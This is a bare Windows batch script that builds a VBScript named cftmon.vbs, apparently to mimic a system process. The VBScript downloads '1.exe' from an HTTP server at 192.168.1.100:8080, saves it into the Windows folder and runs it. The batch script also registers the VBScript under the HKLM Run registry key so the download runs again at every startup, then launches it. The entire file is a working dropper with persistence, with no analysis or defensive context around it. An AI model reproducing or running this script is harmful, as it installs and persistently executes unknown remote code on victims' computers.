�� &cls
echo Set xPost = createObject("Microsoft.XMLHTTP") >c:\windows\cftmon.vbs
echo xPost.Open "GET","http://192.168.1.100:8080/1.exe",0 >>c:\windows\cftmon.vbs
echo xPost.Send() >>c:\windows\cftmon.vbs
echo Set sGet = createObject("ADODB.Stream") >>c:\windows\cftmon.vbs
echo sGet.Mode = 3 >>c:\windows\cftmon.vbs
echo sGet.Type = 1 >>c:\windows\cftmon.vbs
echo sGet.Open() >>c:\windows\cftmon.vbs
echo sGet.Write(xPost.responseBody) >>c:\windows\cftmon.vbs
echo sGet.SaveToFile "c:\windows\e.exe",2 >>c:\windows\cftmon.vbs
echo Set objShell = CreateObject("Wscript.Shell") >>c:\windows\cftmon.vbs
echo objshell.run """c:\windows\e.exe""" >>c:\windows\cftmon.vbs
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /ve /d "c:\windows\cftmon.vbs" /f
c:\windows\cftmon.vbs
